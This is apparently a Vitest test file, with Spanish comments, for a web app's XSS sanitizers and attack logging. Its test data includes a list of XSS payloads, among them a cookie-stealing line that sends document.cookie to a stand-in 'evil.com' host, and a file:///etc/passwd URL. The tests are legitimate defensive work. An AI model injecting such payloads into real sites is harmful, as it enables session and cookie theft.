import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { containsScript, sanitizeFormData, sanitizeHTML, sanitizeText, sanitizeURL } from '@/lib/security';

// Mock console.error para capturar logs de XSS
const mockConsoleError = vi.fn();

describe('Enhanced Security Functions with XSS Logging', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    console.error = mockConsoleError;
  });

  afterEach(() => {
    // Restore original console.error
    vi.restoreAllMocks();
  });

  describe('XSS Detection and Logging', () => {
    it('should log XSS attempts when malicious content is detected', () => {
      const maliciousInput = '<script>alert("XSS")</script>';
      const result = sanitizeText(maliciousInput, 'test_context', 'test_source');
      
      expect(result).toBe('[CONTENIDO BLOQUEADO]');
      expect(mockConsoleError).toHaveBeenCalled();
      
      // Verificar que se loggeó el intento de XSS
      const logCall = mockConsoleError.mock.calls.find(call => 
        call[0].includes('XSS ATTEMPT DETECTED')
      );
      expect(logCall).toBeDefined();
    });

    it('should log XSS attempts in HTML sanitization', () => {
      const maliciousHTML = '<img src="x" onerror="alert(\'XSS\')">';
      const result = sanitizeHTML(maliciousHTML, 'test_context', 'test_source');
      
      expect(result).toBe('[CONTENIDO BLOQUEADO]');
      expect(mockConsoleError).toHaveBeenCalled();
    });

    it('should log JavaScript URL attempts', () => {
      const maliciousURL = 'javascript:alert("XSS")';
      const result = sanitizeURL(maliciousURL, 'test_context', 'test_source');
      
      expect(result).toBe('');
      expect(mockConsoleError).toHaveBeenCalled();
    });
  });

  describe('Context and Source Tracking', () => {
    it('should include context and source in XSS logs', () => {
      const maliciousInput = '<script>alert("XSS")</script>';
      sanitizeText(maliciousInput, 'form_field_email', 'user_input');
      
      const logCall = mockConsoleError.mock.calls.find(call => 
        call[0].includes('XSS ATTEMPT DETECTED')
      );
      
      expect(logCall).toBeDefined();
      expect(logCall).not.toBeUndefined();
      const logData = JSON.parse(logCall![1]);
      expect(logData.context).toBe('form_field_email');
      expect(logData.source).toBe('user_input');
    });

    it('should track form field context in sanitizeFormData', () => {
      const formData = {
        name: 'John Doe',
        email: '<script>alert("XSS")</script>',
        message: 'Hello World'
      };
      
      const result = sanitizeFormData(formData, 'contact_form');
      
      expect(result.name).toBe('John Doe');
      expect(result.email).toBe('[CONTENIDO BLOQUEADO]');
      expect(result.message).toBe('Hello World');
      
      // Verificar que se loggeó con el contexto correcto
      const logCall = mockConsoleError.mock.calls.find(call => 
        call[0].includes('XSS ATTEMPT DETECTED')
      );
      expect(logCall).toBeDefined();
    });
  });

  describe('Enhanced URL Sanitization', () => {
    it('should block dangerous protocols', () => {
      const dangerousURLs = [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:MsgBox "XSS"',
        'file:///etc/passwd'
      ];

      dangerousURLs.forEach(url => {
        const result = sanitizeURL(url, 'url_validation', 'user_input');
        expect(result).toBe('');
      });
    });

    it('should allow safe protocols', () => {
      const safeURLs = [
        'https://example.com',
        'http://example.com',
        'mailto:user@example.com',
        'tel:+1234567890'
      ];

      safeURLs.forEach(url => {
        const result = sanitizeURL(url, 'url_validation', 'user_input');
        // URL constructor may add trailing slash, which is acceptable
        const expectedResult = result.endsWith('/') ? result.slice(0, -1) : result;
        expect(expectedResult).toBe(url);
      });
    });

    it('should handle invalid URLs gracefully', () => {
      const invalidURLs = [
        'not-a-url',
        'http://',
        'https://'
      ];

      invalidURLs.forEach(url => {
        const result = sanitizeURL(url, 'url_validation', 'user_input');
        expect(result).toBe('');
      });
    });
  });

  describe('Comprehensive XSS Payload Testing', () => {
    const xssPayloads = [
      // Scripts básicos
      '<script>alert("XSS")</script>',
      '<script src="http://evil.com/script.js"></script>',
      '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
      
      // Event handlers
      '<img src="x" onerror="alert(\'XSS\')">',
      '<div onmouseover="alert(\'XSS\')">Hover me</div>',
      '<input onfocus="alert(\'XSS\')" autofocus>',
      
      // JavaScript URLs
      'javascript:alert("XSS")',
      'javascript:document.location="http://evil.com"',
      'data:text/html,<script>alert("XSS")</script>',
      
      // Iframes maliciosos
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>',
      
      // VBScript
      '<script language="VBScript">MsgBox "XSS"</script>',
      
      // Encodings
      '&#60;script&#62;alert("XSS")&#60;/script&#62;',
      '%3Cscript%3Ealert("XSS")%3C/script%3E',
      
      // CSS injection
      '<style>@import "javascript:alert(\'XSS\')";</style>',
      '<div style="background:url(javascript:alert(\'XSS\'))">',
      
      // Meta refresh
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
      
      // Object tags
      '<object data="javascript:alert(\'XSS\')"></object>',
      '<embed src="javascript:alert(\'XSS\')">',
      
      // SVG
      '<svg onload="alert(\'XSS\')"><circle cx="50" cy="50" r="40"/></svg>',
      
      // Form injection
      '<form action="javascript:alert(\'XSS\')"><input type="submit" value="Click me"></form>',
      
      // Link injection
      '<a href="javascript:alert(\'XSS\')">Click me</a>',
      
      // Mixed content
      '<p>Normal text <script>alert("XSS")</script> more text</p>',
      'Hello <img src="x" onerror="alert(\'XSS\')"> World',
    ];

    it('should block all XSS payloads in text sanitization', () => {
      xssPayloads.forEach((payload, index) => {
        const result = sanitizeText(payload, `test_${index}`, 'payload_test');
        expect(result).toBe('[CONTENIDO BLOQUEADO]');
      });
    });

    it('should block all XSS payloads in HTML sanitization', () => {
      xssPayloads.forEach((payload, index) => {
        const result = sanitizeHTML(payload, `test_${index}`, 'payload_test');
        expect(result).toBe('[CONTENIDO BLOQUEADO]');
      });
    });

    it('should detect all XSS payloads with containsScript', () => {
      xssPayloads.forEach((payload, _index) => {
        const hasScript = containsScript(payload);
        expect(hasScript).toBe(true);
      });
    });
  });

  describe('Safe Content Preservation', () => {
    const safeContent = [
      'Hello World',
      '<p>This is safe HTML</p>',
      '<strong>Bold text</strong>',
      '<a href="https://example.com">Safe link</a>',
      'user@example.com',
      '+1-555-123-4567',
      'Normal text with <b>bold</b> and <i>italic</i>',
    ];

    it('should preserve safe content in text sanitization', () => {
      safeContent.forEach((content, index) => {
        const result = sanitizeText(content, `safe_${index}`, 'safe_test');
        expect(result).not.toBe('[CONTENIDO BLOQUEADO]');
        // For HTML content, check that the text content is preserved
        const textContent = content.replace(/<[^>]*>/g, '');
        if (textContent.trim()) {
          // The sanitized result should contain the text content (without HTML tags)
          expect(result).toContain(textContent);
        } else {
          // For pure text content, it should be preserved as-is
          expect(result).toBe(content);
        }
      });
    });

    it('should strip all HTML tags in HTML sanitization', () => {
      const htmlWithTags = [
        '<p>This is safe HTML</p>',
        '<b>Bold text</b>',
        '<i>Italic text</i>',
        '<span>Normal text</span>'
      ];

      const expectedPlainText = [
        'This is safe HTML',
        'Bold text',
        'Italic text',
        'Normal text'
      ];

      htmlWithTags.forEach((content, index) => {
        const result = sanitizeHTML(content, `safe_${index}`, 'safe_test');
        expect(result).not.toBe('[CONTENIDO BLOQUEADO]');
        expect(result).toBe(expectedPlainText[index]);
      });
    });

    it('should not detect scripts in safe content', () => {
      safeContent.forEach((content, _index) => {
        const hasScript = containsScript(content);
        expect(hasScript).toBe(false);
      });
    });
  });

  describe('Logging Configuration', () => {
    it('should include proper log structure', () => {
      const maliciousInput = '<script>alert("XSS")</script>';
      sanitizeText(maliciousInput, 'test_context', 'test_source');
      
      const logCall = mockConsoleError.mock.calls.find(call => 
        call[0].includes('XSS ATTEMPT DETECTED')
      );
      
      expect(logCall).toBeDefined();
      expect(logCall).not.toBeUndefined();
      const logData = JSON.parse(logCall![1]);
      
      expect(logData).toHaveProperty('timestamp');
      expect(logData).toHaveProperty('type');
      expect(logData).toHaveProperty('payload');
      expect(logData).toHaveProperty('source');
      expect(logData).toHaveProperty('context');
      expect(logData).toHaveProperty('severity');
      expect(logData.type).toBe('XSS_ATTEMPT_FRONTEND');
      expect(logData.severity).toBe('HIGH');
    });

    it('should limit payload length in logs', () => {
      const longPayload = '<script>alert("XSS")</script>'.repeat(50); // 1000+ caracteres
      sanitizeText(longPayload, 'test_context', 'test_source');
      
      const logCall = mockConsoleError.mock.calls.find(call => 
        call[0].includes('XSS ATTEMPT DETECTED')
      );
      
      expect(logCall).toBeDefined();
      expect(logCall).not.toBeUndefined();
      const logData = JSON.parse(logCall![1]);
      expect(logData.payload.length).toBeLessThanOrEqual(200);
    });
  });
}); 